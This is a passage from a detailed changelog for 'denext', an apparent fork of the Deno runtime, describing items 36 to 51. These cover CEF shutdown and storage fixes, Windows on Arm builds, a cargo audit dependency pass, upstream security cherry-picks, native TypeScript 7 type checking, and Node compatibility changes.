    processes). On a KDE Plasma 6 box (4 cores, 12 busy loops), 50 `exit` area
    runs (550 launches, 6 of each 11 a quit-and-relaunch at once) without the
    LOCK wait and 50 with it all passed, with no LOCK held at a relaunch
    (`fuser` never triggered) and the same run time (81.5 s and 82.5 s on
    average): the race the CI runs hit did not reproduce there. The exit e2e
    area quits and relaunches at once to check localStorage survives, and the
    deeplink area logs the scheme owner over time after a forced registration.
    On Windows, a file dialog's abort that reaches laufey's I/O thread before
    the COM dialog exists is remembered and settles the dialog cancelled without
    showing it (it used to be dropped and the dialog stayed open, a likely cause
    of the dnd area's abort check timing out once on a hosted runner); laufey's
    CI covers it with `LAUFEY_TEST_WIN_DIALOG_SETUP_PUMP_MS` and
    `dialog_abort_stress`'s 0 ms abort. The e2e artifact now carries each app's
    `w/e2e-results` (for example `dialogWindowAfterMs`).

36. **`fix(compile)`: a compiled program keeps `--unstable-no-legacy-abort`**
    (from `denext.21`; `cli/rt/run.rs`). `deno compile` already embedded the
    unstable features in the binary's metadata, but the standalone runtime
    started its workers with `no_legacy_abort: false`, so a compiled app (and a
    `deno desktop` app) aborted `request.signal` after every successful response
    and printed `Deno.serve`'s legacy-behavior notice on its first request even
    when it was compiled with the flag or with `"unstable": ["no-legacy-abort"]`
    in its config. The setting now comes from the metadata, so the compiled app
    behaves as `deno run` with it. Test: the `compile::no_legacy_abort` spec
    (the flag, the config, and without it). Since item 102 the new behavior is
    the default and the metadata carries the opt-out, `legacy-abort`, instead.

37. **Spellcheck on Linux CEF** (from `denext.21`; laufey `integration/denext21`
    `df1d8c8`, no runtime API). The Linux CEF host never lets Chromium download
    a Hunspell dictionary from Google (laufey's network-quiet defaults, since
    `denext.11`), so a fresh profile had no spellcheck. The Linux CEF archives
    now ship Chromium's prebuilt dictionaries of the common languages (en-US,
    en-GB, de-DE, fr-FR, es-ES, pt-BR, it-IT; about 14 MB) in
    `laufey/cef/build/Release/dictionaries/`, fetched by
    `.github/denext-runtime/fetch_dictionaries.py` from
    chromium/deps/hunspell_dictionaries at the commit CEF 150's Chromium pins
    (so the versioned names are the ones it asks for) and pinned by SHA-256;
    each dictionary's license is in `licenses/hunspell/`. Before the first
    browser the host copies the dictionaries of the languages in use (the
    profile's `spellcheck.dictionaries`, else the UI language) into
    `<profile>/Dictionaries`, taking them from `LAUFEY_SPELLCHECK_DICTIONARIES`
    (a folder, for a launcher or a developer) first, then from `dictionaries/`
    beside the host executable, where an app adds or replaces its own `.bdic`
    files when it packages; a dictionary the profile already has is never
    replaced, and the copy goes through a temporary name. Tests: laufey's
    `cef_network_quiet_test` (`DictionariesToSeed`), `verify.sh` (the archive
    holds exactly the pinned files) and the Linux CEF launch smoke (the profile
    has its language's dictionary after the first launch).

38. **A Windows on Arm runtime** (from `denext.21`; the release workflow only).
    `aarch64-pc-windows-msvc` joins the release matrix on GitHub's
    `windows-11-arm` runner, for the runtime archives (webview and CEF: CEF's
    `windowsarm64` distribution, `make ... UNAME_M=aarch64` because an emulated
    shell reports `x86_64`) and for the CLI and `denort` archives (esbuild's
    `@esbuild/win32-arm64`, pinned like the others). The MSVC environment, VS's
    LLVM (`libclang`) and the Rust toolchain are the runner's ARM64 ones (the
    toolchain named with its host so an emulated `rustup` can't pick x86_64),
    and every Windows binary's PE machine type is checked against the target
    when it is built. A release now has 12 runtime, 6 CLI and 6 `denort`
    archives.

39. **`feat(desktop)`: `--inspect-renderer` on its own (spike)** (from
    `denext.21`; CLI only; `cli/tools/desktop_renderer_inspect.rs`, design note
    `doc/denext-inspect-renderer.md`).
    `deno desktop --inspect-renderer[=<addr>]` without `--inspect` runs the app
    as a development build with its window's renderer open to a debugger: CDP on
    loopback for CEF (the host's `LAUFEY_REMOTE_DEBUGGING_PORT`) and WebView2
    (`WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` `--remote-debugging-port`),
    WebKit's own HTTP inspector for WebKitGTK (`WEBKIT_INSPECTOR_HTTP_SERVER`),
    and a pointer to Safari's Develop menu for WKWebView. It prints the page's
    `webSocketDebuggerUrl` once the window has loaded. A bare
    `--inspect-renderer` (port 0) now gets a free port, also behind the
    `--inspect` multiplexer. Tests: `desktop_renderer_inspect::tests`; a CDP
    client's `Runtime.evaluate` in a CEF window on Linux by hand (the note says
    what was and wasn't run).

40. **`fix(desktop)`: an Arm64 `.msi` declares schema 500** (from `denext.21`;
    CLI only; `cli/tools/desktop.rs`, `msi_schema_for_arch`). `deno desktop`
    wrote Page Count 200 (Windows Installer 2.0) into every `.msi`, but Windows
    Installer opens a package whose Template is `Arm64;...` only at schema 500
    and refuses it with 1620 ("This installation package could not be opened"),
    so no Windows on Arm `.msi` it built could install. It now writes 500 for
    Arm64 (200 for x64, as before). Test:
    `msi_arm64_package_declares_schema_500`. The e2e suite packages with the
    stock CLI, so on Windows on Arm its deeplink area reports the stock `.msi`
    as n/a with the summary it read (Template and Page Count, through Windows
    Installer's COM API) and installs a copy set to 500 for the rest of its
    checks. The same run's menus area reports its keyboard checks as n/a when
    Windows refuses the window the foreground for a reason it can name (another
    process keeps it, none holds it, the session is not the console's or can't
    open the input desktop), with that evidence in the results file.

41. **A macOS CEF quit no longer waits 5 s** (from `denext.21`; laufey
    `integration/denext21` `165d2c7`, no runtime API). Every quit of a macOS CEF
    app took over 5 s and logged that a helper was still running 5 s after
    shutdown: the host waited for Chromium's `--type=code-sign-clone-cleanup`,
    which the browser process starts during shutdown to delete its code-signing
    clone of the app bundle and which polls `getppid()` until the browser has
    exited, so the wait only ever ended at its deadline. The host now leaves it
    out of the post-shutdown wait, as it does the zygotes and the crash handler;
    the 5 s bound stays for the other helpers. On an x86_64 Mac the median quit
    went from 5246 ms to 649 ms. On macOS the profile's LevelDB `LOCK` files are
    held by the host itself (Chromium sandboxes the storage service and the
    browser opens its files), so no helper outliving the host can hold them.
    Tests: laufey's `cef_profile_lock_test`; the e2e exit area checks for every
    CEF launch that the process is gone within 3 s of the app asking
    (`E2E_EXIT_QUIT_BUDGET_MS`), that the host logged no helper outliving its
    shutdown, and on macOS and Linux that nothing the launch started outlives it
    but those after-the-browser helpers, gone within 3 s; its quick
    quit-and-relaunch cycles (localStorage and IndexedDB carried over) go from 6
    to 10.

42. **A `cargo audit` pass** (from `denext.22`). Every RustSec advisory in
    `Cargo.lock` that has a fixed release is bumped to it: rustls 0.23.46
    (RUSTSEC-2026-0285, -0346, -0348, -0349; with aws-lc-rs 1.18.2 and the
    workspace aws-lc-sys pin 0.46.0, so the tree keeps one aws-lc-sys),
    tokio-postgres 0.7.18, postgres-protocol 0.6.12 and postgres-types 0.2.14
    for `Deno.SQL` (RUSTSEC-2026-0178, -0179, -0180), zip 9.0.4
    (RUSTSEC-2026-0367, -0368, -0369; `deno upgrade` and `deno compile` unpack
    with `extract()`), quinn-proto 0.11.19 (RUSTSEC-2026-0338 to -0342),
    quick-xml 0.41.0 through plist 1.10.0 (RUSTSEC-2026-0194, -0195), unicycle
    0.10.3 (RUSTSEC-2026-0298) and crossbeam-epoch 0.9.21 (RUSTSEC-2026-0204),
    plus the crates flagged unsound or yanked (anyhow, faster-hex, memmap2, rand
    0.8.6, scc, chacha20, der, digest, spin). `.cargo/audit.toml` lists the one
    left, with its reasoning: rsa RUSTSEC-2023-0071 (Marvin; no fixed release
    exists, an accepted risk for RSA PKCS#1 v1.5 decryption in WebCrypto and
    `node:crypto`). hickory-proto RUSTSEC-2026-0118 (DNSSEC validation, not
    compiled) and -0119 were ignored here until item 71 moved the tree to
    hickory 0.26, which neither advisory affects. libz-sys RUSTSEC-2026-0418
    (3.0.0-denext.3; the build script prints the build environment into
    `target/`, only with cc 1.6.0 or later, and the lock has cc 1.2.56) is
    listed too: the fixed 1.1.31 fails to link the Windows debug test binaries
    (unresolved `__imp__wassert` from zlib-ng's SIMD objects). Two bumps change
    an API the tree uses: zip 9's `enclosed_name` drops a leading root or drive
    prefix instead of refusing the name, so the laufey archive extractor
    (`cli/tools/desktop.rs`) refuses an absolute entry name itself first
    (`extract_zip_rejects_absolute_path`); and aws-lc-rs 1.18 stabilized ML-DSA,
    so `ext/crypto/mldsa.rs` uses `aws_lc_rs::signature::*` and `to_pkcs8v1`
    (the deprecated `unstable` aliases failed clippy). The `denext
    tests`
    workflow runs `cargo audit` and fails on any advisory not listed there.
    laufey `integration/denext22` (`58c0fdb`) does the same for the hosts'
    `Cargo.lock` (bytes 1.12.1 for RUSTSEC-2026-0007, crossbeam-epoch, quick-xml
    0.41.0) with a `cargo audit` job in its CI; this fork pins it (no API
    change). CEF (149.0.5) has no audit database; it follows Chromium releases
    through laufey's `CEF_VERSION`.

43. **Upstream batch: `main` picks and open pull requests** (from `denext.22`).
    Cherry-picked from denoland/deno `main` with `-x`: `AbortSignal.any()`
    validates its input like Node (#36293), `mock.reset()` restores
    `mock.method()` implementations (#36886), Node-API finalizers in a
    `BTreeMap` (#36895), `node:assert` message functions and format arguments
    (#36944), xxhash-rust 0.8.16 (#36963), zsh completion of `deno run` script
    paths (#36976), abbreviated packuments under `minimumDependencyAge`
    (#36907), `SharedArrayBuffer` in the primordials (#36627) and no
    null-prototype objects for default parameters (#36940), and `errno_location`
    for Android bionic (#36890). Carried from open upstream pull requests, one
    commit each with an `Original-Author:` trailer:
    - memory safety and crashes: a detached `net` onread buffer is kept alive
      (#37013, a use-after-free), `napi_create_typedarray` checks its length for
      overflow (#36991), the `getifaddrs` list stays alive through an IPv6
      interface lookup (#36351, a double free), `serde_v8` returns an error
      instead of panicking on an unsupported value (#36852), and the callsite
      cache no longer goes through `Array.prototype` accessors (#36820);
    - security: CR/LF is refused in a `node:http` proxy request target (#36919),
      stream event maps are guarded against prototype pollution (#36956),
      `op_require_try_self` needs `--allow-read` (#35943), `tty.ReadStream` /
      `WriteStream` check fd permissions (#36220), npm package names used in
      cache paths are validated (#36469), `startTls`'s internal options are out
      of reach of user objects (#36249), and EC public keys not on the curve are
      refused at import (#37032).

    #36905 is carried in part, the scope of #36595: reading `process.debugPort`
    (`op_inspector_port`) needs `--allow-sys=inspector`. Its other half, the
    same check on `op_inspector_enabled`, is left out: the inspector Network
    bridge asks that on every `node:http` client request, so with it any
    `http.get()` run without `--allow-sys=inspector` threw `NotCapable`. The
    spec `tests/specs/node/process_debug_port_permission` covers both, and that
    `http.get()` works under `--allow-net` alone. The dependabot hickory 0.26.2
    bump (#36971) is not carried: it moves only `hickory-resolver` and leaves
    `hickory-proto` 0.25.2, the crate the advisories name.

    Tests: each pull request's own (`tests/specs/node`, `tests/specs/run`,
    `tests/specs/permission`, `tests/specs/npm`, `tests/specs/install`,
    `tests/unit`, `tests/unit_node`, `tests/napi`, `serde_v8`, and the
    `node_compat` `test-assert.js` / `test-abortsignal-any.mjs` entries); the
    #36956 test reads `stream._events` through a cast, since the stream types do
    not declare it and `unit_node`'s type check refused it.

44. **A CEF quit keeps the `localStorage` the page just wrote** (from
    `denext.22`; laufey `integration/denext22` `b4f35ee`, no runtime API).
    Chromium's storage service writes `localStorage` to a LevelDB database, and
    `CefShutdown` kills it without waiting for a write in flight (Chromium waits
    only for the network service, which keeps cookies). Two consequences, both
    fixed in the hosts:
    - a write cut short at the end of the database's log cost every later
      launch's writes: LevelDB reuses the log and appends after the torn record,
      then drops everything after it in its 32 KiB block on the next open, so
      the next launch read the value from before, again and again (laufey CI run
      39028399584 lost 2 of 3 quick quits that way; reproduced with the LevelDB
      revision Chromium pins, and on CEF on macOS and Linux by tearing the log's
      end). Every CEF host now cuts such a torn end before `CefInitialize`, once
      the database's `LOCK` is free, and says so on stderr;
    - on macOS the host's loop stops when the last window closes, so the tasks
      that end that window's renderer (whose end makes the storage service
      commit the page's writes at once) ran only inside `CefShutdown`, racing
      the kill: the renderer was still running at `CefShutdown` in 27 of 50
      traced quits. The host now pumps CEF until those renderers have ended (at
      most 2 s, logged when one outlives that).

    Not caused by item 41: the storage service is killed inside `CefShutdown`
    either way and its 5 s wait came after that; on macOS-14 runners 150 quick
    quit / close / exit cycles lost nothing both before item 41 and with it, so
    the loss needs a torn write, which is rare, and then lasts. With the fix:
    150 cycles, 0 lost, and the torn-log check passes (it fails without the
    repair). Tests: laufey's `cef_profile_lock_test` (the log tail repair
    against LevelDB-format logs: torn header, torn payload, a fragmented record
    cut before its end, a write appended after a torn one, damage in the last
    and in an earlier block; a database whose `LOCK` is held is left alone; the
    renderer wait) and its exit e2e (a torn log end is cut and the value written
    after it read back; no renderer outlives the loop); this fork's e2e exit
    area (quick quit-and-relaunch cycles keep localStorage and IndexedDB) is
    unchanged.

45. **Item 44's follow-ups: IndexedDB, Windows, and a quit under load** (from
    `denext.22`; laufey `integration/denext22` `3f25338`, no runtime API).
    - IndexedDB's databases are LevelDB too (Chromium 149 keeps IndexedDB on
      LevelDB; its SQLite backend is off by default), in the same storage
      service and reusing their logs the same way, so a write the kill cuts
      short tears them the same way. There the open after the next append fails
      outright: IndexedDB opens with paranoid checks, so Chromium finds the
      database corrupt and deletes the origin's IndexedDB (the page's `open`
      reports `dataLoss: "total"`, "checksum mismatch"; reproduced on Linux CEF
      by tearing the log's end). The host's tail repair now covers every
      IndexedDB database of the profile (`IndexedDB/*.indexeddb.leveldb`,
      `WebStorage/<bucket>/IndexedDB/indexeddb.leveldb`), still skipping one
      whose `LOCK` is held (laufey `9f47c3e`).
    - Windows had item 44's renderer race: a trace of 20 quick quits had a
      renderer still running when `CefShutdown` started in 9. The Windows host
      now runs the same drain (none in 20 with it, 4-100 ms). Linux does not:
      its renderers had ended when `CefRunMessageLoop` returned in all 50 traced
      quits, idle and with the CPU busy, so its host is unchanged (laufey
      `9d76415`).
    - With every core busy, the first macOS CEF quit never ended (laufey runs
      39034783854 and 39033696992; it predates item 41). `CefShutdown` waited,
      with no timeout, for thread-pool tasks queued for workers Chromium runs at
      background QoS, which macOS gives no CPU while threads of a higher QoS
      keep every core busy (a spindump had eight of the host's threads runnable
      at priority 4 for 65-97 s); Chromium raises its workers for shutdown only
      from inside each worker, which a starved one never runs. The same load at
      background QoS, or none, hung nothing. Before `CefShutdown` the macOS host
      now gives every thread a QoS override to user-initiated and turns any
      later request for background QoS into user-initiated (an interposer in the
      dylib it already loads for the keychain) (laufey `3f25338`). Its exit e2e
      ends with a quit while every core is busy.

    Tests: laufey's `cef_profile_lock_test` (the IndexedDB databases found, cut,
    and left alone while their `LOCK` is held), `keychain_interpose_mac_test` (a
    starved background thread raised, later requests turned), and its exit e2e
    (a torn IndexedDB log is cut and the value written after it read back; the
    quit under load). This fork's e2e is unchanged.

46. **`feat(lsp)`: a TypeScript 7 (tsgo) language service for `deno lsp`,
    unstable and off by default** (the default of a denext release since item
    94; `feat/tsgo-lsp`; `cli/lsp/tsgo.rs`, `cli/lsp/ts_server.rs`,
    `cli/tsc/native_pin.rs`, `cli/tsc/typescript_pins.json`,
    `.github/denext-runtime/fetch_typescript.py`,
    `tools/update_typescript_pin.ts`). `"deno.unstable": ["tsgo-lsp"]` in the
    editor's initialization settings, or `DENO_UNSTABLE_TSGO_LSP=1` in the
    environment of `deno lsp` (which wins either way), puts a `TsServer::Go`
    backend behind `deno lsp` instead of the in-isolate TypeScript 6 service.
    `deno lsp` stays the editor's only server: Deno's own features (resolution
    diagnostics, lint, formatting, test code lenses, registry and import-map
    completions, the `deno/*` requests) are unchanged, and the TypeScript
    features go to a pinned native `tsc --lsp` child that `deno lsp` is the LSP
    client of. Open `file:` scripts are mirrored with `didOpen` / `didChange` /
    `didClose` in the same write as the request that follows (so tsgo answers
    against the text the positions refer to), the editor's watched-file events
    are forwarded, diagnostics are pulled (`textDocument/diagnostic`), filtered
    by the same ignored codes and attributed to `deno-ts`, and hover,
    definition, type definition, implementation, references, rename, completion
    (+ resolve), signature help, code actions (+ resolve, organize imports),
    document symbols, highlights, folding and selection ranges, inlay hints,
    call hierarchy and workspace symbols are standard requests whose URIs are
    mapped back. tsgo is told `importModuleSpecifierEnding: "js"` unless the
    user chose otherwise, so auto-imports and import fixes write `./mod.ts` as
    Deno needs. tsgo has no resolution hooks over LSP, so the backend runs
    `deno sync-types` (the generator the native `deno check` uses) in each
    workspace root before starting tsgo, after `deno.cache` and after a config
    change, then announces the regenerated `.deno/` files (the root
    `tsconfig.json` is an open document it gives tsgo since item 94);
    `DENO_TSGO_LSP_SYNC_TYPES=0` leaves them to the user. The compiler is pinned
    per role in `typescript_pins.json` (role `lsp`: a dated `7.1.0-dev` nightly)
    by the npm `dist.integrity` of each `@typescript/typescript-<platform>`
    tarball; it is found as `DENO_TSGO_LSP_BIN`, else `typescript-lsp/tsc[.exe]`
    next to `deno` at the pinned version (the CLI zip ships it, item 26), else
    downloaded once into `DENO_DIR/dl/typescript-lsp-<version>/` and verified
    against the pin. `tools/update_typescript_pin.ts lsp next` is the whole
    bump; then
    `cargo test -p integration_tests --test integration --
    lsp_tsgo`. Not
    yet with tsgo: TypeScript code lenses, file-rename import edits,
    `deno/inferredType`, ambient-module listing, notebooks and remote (`deno:`)
    documents (semantic tokens, the Vitest / Jest types and types for a newly
    imported cached dependency came with item 81). Tests: `native_pin` and
    `tsgo` unit tests; `tests/integration/lsp_tsgo_tests.rs` (each feature, Deno
    lint and test code lenses alongside, import-map / `jsr:` / `npm:`
    specifiers, Deno's lib types and `Deno.SQL`), whose harness fetches the
    pinned build into `target/`; `DENO_TSGO_LSP_PERF=1` adds a timing comparison
    with the TypeScript 6 service; `cli_smoke.sh` checks the shipped
    `typescript-lsp/tsc --version`.

47. **`feat(check)`: native type checking on TypeScript 7** (from `denext.22` or
    later; `feat/native-check`, CLI only; `cli/tsc/native.rs`,
    `cli/tools/check.rs`, `cli/type_checker.rs`, `cli/tsc/tsconfig_gen.rs`,
    `cli/tools/installer/{local,npm_compat}.rs`,
    `.github/denext-runtime/fetch_typescript.py`). Every command that
    type-checks (`deno check`, `run --check`, `test`, `bench`, `bundle --check`,
    `cache
    --check`, `publish`, ...) runs the native TypeScript compiler
    (`typescript@7.0.2`, "tsgo") by default instead of the in-process
    TypeScript. It is a selective port of upstream's unreleased "Deno 3" series
    on `main` (each pick `cherry-pick -x` with an `Original-Author:` trailer):
    #35639 (Deno's libs defer web globals to `lib.dom`), #35641 and #35871 (one
    `@types/node`), #35642 (the in-process compiler is stock `typescript@6.0.3`,
    the fork's dual global tables replaced by `.d.ts` markers), #35868
    (`export =` in an ES module is an error), #35885 / #35888 (tests), #35894 /
    #35937 / #35966 (`deno sync-types`: a stock `tsconfig.json` in `.deno/`,
    Deno's types as a private `@types/deno`, the `jsr:` / `http(s):` / `npm:`
    types mirrored), #35935 (the dead `typescript_go_client` crate,
    `--unstable-tsgo` / `DENO_UNSTABLE_TSGO` removed), #36102 / #36104 / #35938
    (run the compiler, map its diagnostics back), #36171, #36177, #36178 (local
    wasm imports), #36697 and #36883. The clap-era flag hunks are ported to
    `libs/cli_parser` (`deno sync-types [roots] [--allow-import]`). What the
    fork does differently from upstream's `main`:
    - **No download.** Upstream fetched `@typescript/typescript-<platform>` from
      npm on first use (#36102). The compiler is the `check` role of item 46's
      `cli/tsc/typescript_pins.json` (7.0.2, per-platform npm `dist.integrity`;
      bumped only by `tools/update_typescript_pin.ts check
      <version>`),
      and each `deno-cli-*` archive ships it in `typescript-check/` beside
      `deno` (`tsc[.exe]` with the `lib.*.d.ts` files it loads from its own
      directory, its Apache-2.0 `LICENSE` and `NOTICE.txt`, and
      `typescript.json`), fetched and verified by `fetch_typescript.py check`.
      `BUILD_INFO.json` records it as `typescript_check`, and `manifest.json`
      lists `typescript_check:
      { version, sha256, tree_sha256 }` per CLI
      target (the binary's SHA-256 and one over every file of the directory,
      recomputed from the zip; denext pins both). `deno` looks for it in this
      order (`native.rs`, on `native_pin::find_local`): `DENO_TSGO_BIN` (used at
      any version, with a warning; an error if it is not a file), then
      `typescript-check/tsc` beside the executable (also through a symlink to
      it) and then denext's toolchain cache
      (`<DENO_DIR>/denext-deno/<version>/<target>/
      typescript-check/`,
      newest first), each used only at the pinned version. Unlike the `lsp`
      role, `check` never falls back to a download: when none is found the check
      fails with an error that names `denext toolchain install`, `DENO_TSGO_BIN`
      and the fallback. `DENO_TSC_BIN` (documented upstream, read by nothing
      here) and `tools/download_tsc.ts` are gone; the test harness fetches the
      pinned build into `target/typescript-check-<version>/` once and passes it
      as `DENO_TSGO_BIN` (to `TestContextBuilder` commands and `deno_cmd()`
      alike, so a unit test's `run --check` child finds it).
    - **Every entry point.** Upstream switched only `deno check` (#36086 left
      the rest on the in-process checker). Here `TypeChecker::check_graph` picks
      the engine for every graph a command checks, and `deno check` and it share
      `run_native_check`: Deno's own graph walk and its check cache stay in
      front of the compiler (an unchanged graph that checked clean skips both
      the type materialization and the spawn, about 0.04 s), then the config is
      generated (in the workspace the command found: the re-read as
      `deno
      check <roots>` starts the config discovery where the command
      did, `InternalFlags::config_discovery_start`, and reads the config file
      the workspace loaded, `--config x.json` or `publish`'s `jsr.json(c)`, and
      the `--import-map` given), the compiler runs pinned to the graph's roots
      (`files` in a per-run tsconfig in the system temp dir) and its diagnostics
      are mapped back. `run --check` & co. keep their `--no-check` hint.
      `deno publish` type-checks the package sources natively; the extra check
      of the in-memory fast-check output (Deno's own generated types, which the
      compiler cannot read) runs only on the in-process engine.
      `deno check --watch` re-runs on changes (a watcher-aware factory; upstream
      ran once, #36089). A graph the generated stock project can't express keeps
      the in-process checker, for every command including `deno check`
      (`TypeChecker::native_unsupported`): sloppy imports, `--ext`,
      `--unstable-detect-cjs`, a Vitest / Jest config (its aliases), `data:` /
      `blob:` modules, a remote module's code blocks, CommonJS modules, a module
      without a TypeScript or JavaScript extension, a type redirect
      (`X-TypeScript-Types`, `@ts-self-types`, `@deno-types`), a `text` /
      `bytes` import, a `/// <reference lib="deno.*" />` or
      `/// <reference types="npm:…" />` (any scheme) in the project, a JSX
      runtime Deno resolves through an import map, a remote or missing module,
      or a `jsxImportSource` with a scheme (`npm:preact`), workspace `links`,
      workspace members that map one import key differently (a member's other
      `imports` join the generated `paths`), a worker's graph (the `deno.worker`
      lib), a remote `compilerOptions.types` entry, and a `JSR_URL` other than
      jsr.io (the native path takes `jsr:` types from npm.jsr.io, which mirrors
      jsr.io only). For `run --check`, `test` & co. a local module the graph
      could not load does too: Deno reports it with its hints, where the
      compiler's resolution would even accept `./a.js` for `a.ts`
      (`deno
      check` reports it as the compiler does, as upstream).
    - **The fallback.** `--check-engine=tsc` (a hidden global flag, so no help
      text changed) or `DENO_CHECK_ENGINE=tsc` type-checks with the in-process
      TypeScript 6.0.3 as before; `--check-engine=native` wins over the env, and
      an unknown env value warns and checks natively. The code blocks of
      `deno check --doc` / `--doc-only` and `deno test --doc` are checked
      natively too (item 81). `deno lsp` keeps the in-process language service
      unless item 46's tsgo backend is selected.
    - **Our own types on the native path.** The generated `@types/deno` carries
      `Deno.SQL` / `Deno.sql` (item 24) also for a
      `"lib":
      ["deno.ns", "dom"]` project, and Deno's desktop lib
      (`lib.deno.desktop.d.ts`) for `deno desktop` / `deno check --desktop` (the
      desktop type lib) or a `"lib": ["deno.desktop"]` config. A `lib` that
      names `deno.window` (or `deno.worker`) next to `dom` keeps Deno's web
      libs, which merge into `dom`'s declarations as they do in the in-process
      checker (upstream emitted only the `Deno` namespace whenever `dom` was
      listed, which lost e.g. `Transformer.cancel`). The built-in `vitest` /
      `vite-plus/test` / `@jest/globals` types (items 23 and 29) are written to
      `.deno/types/deno-vitest/` and mapped through `paths` (their `npm:` forms
      and subpaths too) for each package that is not installed (an installed
      package's own types still win); a `globals.d.ts` per not-installed package
      in the generated `typeRoots` serves
      `/// <reference types="vitest/globals" />` and `compilerOptions.types`;
      with a Vitest or Vite config, Vite's asset, CSS module, `?raw` / `?url` /
      `?inline` / `?worker` imports get ambient declarations.
      `test.vitestCompat: false` turns all of it off. An absolute `file:` import
      (written in source, or an import-map target such as
      `"lib/": "file:///a/lib/"`) is mapped to its file through `paths`, as Deno
      resolves it from anywhere (the compiler alone read `file:///a/b.ts` as a
      package name, TS2307; `tests/specs/check/file_url_imports`,
      `test_add_file_url_paths`). `@types/node` is never downloaded: unless the
      project has its own under `node_modules`, the copy built into the binary
      (`cli/tsc/dts/node`, the in-process checker's, `undici-types` included) is
      written to `.deno/npm-compat/@types/node` (staged and renamed into place),
      so type checking needs no network for Node's or the web's globals; a root
      `package.json` dependency maps to `npm:` when there is no `node_modules`.
      The check cache is item 28's `check_cache_v2_denext`, its hash keyed on
      the compiler version.
    - The compiler runs with `--pretty true`: the diagnostics keep their exact
      spans and their related information ("The expected type comes from ..."),
      as the in-process checker reports them (a location in the generated config
      is left out). Several related entries print a blank line apart (they ran
      together on one line before). The generated `.deno/` files are written
      atomically, so concurrent checks of one project never read each other's
      half-written `@types/deno`, and `.deno/` is never one of the project's
      modules (excluded from the generated `include` and from `deno check`'s
      collected roots). While the project is generated, log records below
      `Error` are dropped on the checking thread only
      (`deno_lib::util::logger::quiet_below_error`), never through the global
      level, which hid the inspector's "Debugger session started.".
    - `deno sync-types` skips a `jsr:` import whose package a workspace member
      provides (the generated `paths` already point at the member, and the
      published version may not exist yet), and an unresolvable `jsr:` version
      leaves that package unmapped instead of failing the whole run. Known
      differences (TypeScript 7 or the stock-project model, not the port):
      unions print sorted (stable type ordering); related information ("'x' is
      declared here") is not shown; `export =` in an ES module is TS1203;
      `.deno/` (gitignored by its own `.gitignore`) is written into the project
      root; tsgo 7.0.2 rejects a regex character-class range bounded by a
      literal (unescaped) character above U+07FF (TS1516; escapes work). Tests:
      `tests/specs/check/check_engine` (native by default, the flag, the env,
      the flag over the env, unknown values, `test` / `run --check` / `bench`
      natively and with `tsc`, `--doc-only` on the in-process checker,
      `DENO_TSGO_BIN` that is not a file), `tests/specs/check/native_sql_types`,
      `desktop_types` under both engines, upstream's native `check` specs, the
      `resolve_tests` in `cli/tsc/native.rs` (the sibling, a symlinked
      executable, the toolchain cache newest first, the override, the
      missing-compiler error), `check_engine_resolution` in `cli/args/mod.rs`
      and `check_engine_flag` / `sync_types_subcommand` in `libs/cli_parser`,
      `pretty_tests` in `cli/tsc/native.rs`. CI: `cli_smoke.sh` checks
      `typescript-check/tsc --version` and an offline `deno check` (native and
      `--check-engine=tsc`) from every unpacked release zip.

48. **`test(node_compat)`: 228 more Node.js tests, and the suite in CI**
    (`feat/node-compat`). Node's own test suite (`tests/node_compat`,
    `denoland/node_test` at Node v26.5.1) had about 500 tests that passed on
    `denext.21` but were not in `config.jsonc`, so nothing caught a regression
    in them. Half of those only passed vacuously: they print
    `1..0 # Skipped: ...` (`common.skip`, for example "missing FFI" or "no valid
    readable TTY") and exit 0, so they are left out. Of the rest, the ones that
    pass under this fork's own runner with a debug build are now enabled (228:
    191 added, 37 whose `ignore` was stale; network tests, tests marked flaky or
    timing out, ones too slow for a debug build and one that waits on GC timing
    are left out). The harness now collects `async-hooks/` (the
    `node:async_hooks` suite; still only the listed tests run). The fork's CI
    had dropped upstream's node_compat job with the generated workflows;
    `denext tests` runs it again on Linux (two shards, `denext_tests_os.yml`).
    Before: 3343 enabled on linux-x86_64; after: 3571.

49. **`ci`: the npm matrix** (`tests/npm_matrix`,
    `.github/workflows/denext_npm_matrix.yml`). 54 programs over about 68 real
    npm packages (frameworks, ORMs and database clients, native addons, test
    runners, build tools, browsers, network clients, logging, cloud SDKs), each
    in its own package.json project, installed with `deno install` and run with
    no `node` on `PATH`, against throwaway Postgres 17, Redis 7, MongoDB 7 and
    MinIO containers (`services.sh`). Direct dependencies are pinned to exact
    versions; each case's `case.json` carries its command and expected status
    (`pass`, `pass-with-allow-scripts`, `fail`), and a run fails when a case
    does worse than expected. Nightly, on dispatch (`only` narrows it) and on a
    push that changes it. `README.md` there says how to run it locally.

50. **`fix(ext/node)`: a pipe from a stream flagged destroyed drains**
    (`ext/node/polyfills/internal/streams/readable.js`). Node 26
    (nodejs/node#62557) made `Readable.prototype.resume()`/`pause()` no-ops on a
    destroyed stream. Old code sets `this.destroyed = true` as a flag right
    before `push(null)` (fd-slicer under yauzl / extract-zip: puppeteer's,
    electron's and cypress's installers), and a pipe whose destination applied
    backpressure then never resumed its source: extraction stopped after a few
    entries and the process idled. Node reverted the change on v24 (24.18.0,
    nodejs/node#63487) and still hangs on v26; upstream Deno closed its fix
    (#35403) as "matches Node 26". The fork keeps the no-op only for a stream
    that is really finished (nothing buffered, no `'end'` still to emit), the
    narrower guard tested in nodejs/node#63487, so `test-stream-destroy.js`
    keeps its contract and the pipe drains. Spec:
    `node/stream_pipe_destroyed_flag` (the pipe, an EOF-only tail, through zlib,
    and the no-op on a real `destroy()`; it hangs on `denext.21` and on Node
    26.5.1, passes on Node 24.18).

51. **`feat`: CommonJS detection by default** (behavior change;
    `IsCjsResolutionMode::for_project` in `libs/resolver/cjs/mod.rs`). An
    ambiguous JavaScript file (`.js`, `.jsx` with no `"type"` in its
    package.json, or with no package.json) that uses CommonJS (`require`,
    `module.exports`, `exports`, `__dirname`, `__filename`) and no ES module
    syntax (`import`/`export`, `import.meta`, top-level `await`) is now
    CommonJS, as Node runs it (`--experimental-detect-module`, the default since
    22.7), in a project with a package.json and when there is no config file at
    all. Before, such a file was always ESM and `require` threw "require is not
    defined" unless `--unstable-detect-cjs` was passed. Every other ambiguous
    file keeps Deno's ESM default: TypeScript (`.ts`, `.tsx`) unless its
    package.json says `"type": "commonjs"`, and JavaScript that never touches
    CommonJS, where Node's CommonJS would differ from ESM only in sloppy-mode
    details (top-level `this`, `var` globals, stack frames). Applying Node's
    rule to every untyped file changed the behavior of about 40 of the fork's
    own config-less `run`/`bench`/`test` specs, a measure of how much plain Deno
    code it would reach. The binding check is a cheap textual scan of a file
    that parsed with no ES module syntax (as `deno eval`'s), cached per file. A
